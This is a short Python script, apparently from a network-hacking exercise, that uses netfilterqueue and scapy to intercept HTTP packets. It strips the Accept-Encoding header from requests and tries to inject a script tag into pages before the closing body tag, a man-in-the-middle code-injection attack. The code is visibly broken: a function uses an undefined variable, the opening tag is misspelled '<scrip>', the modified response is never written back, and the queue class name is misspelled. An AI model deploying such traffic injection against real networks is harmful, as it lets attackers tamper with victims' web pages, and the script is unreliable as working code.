#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re

ack_list = []


def set_load(packet, load):
    my_packet[scapy.Raw].load = load
    del my_packet[scapy.IP].len
    del my_packet[scapy.IP].chksum
    del my_packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    my_packet = scapy.IP(packet.get_payload())
    if my_packet.haslayer(scapy.Raw):
        if my_packet[scapy.TCP].dport == 80:
            print("[+] Request...")
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", my_packet[scapy.Raw].load)
            new_packet = set_load(my_packet, modified_load)
            packet.setpayload(str(new_packet))
            print(my_packet.show())
        elif my_packet[scapy.TCP].sport == 80:
            print("[+] Response...")
            modified_load  = my_packet[scapy.Raw].load.replace("</body>", "<scrip>alert('test');</script></body>")
    packet.accept()


queue = netfilterqueue.NetfiletrQueue()
queue.bind(0, process_packet)
queue.run()
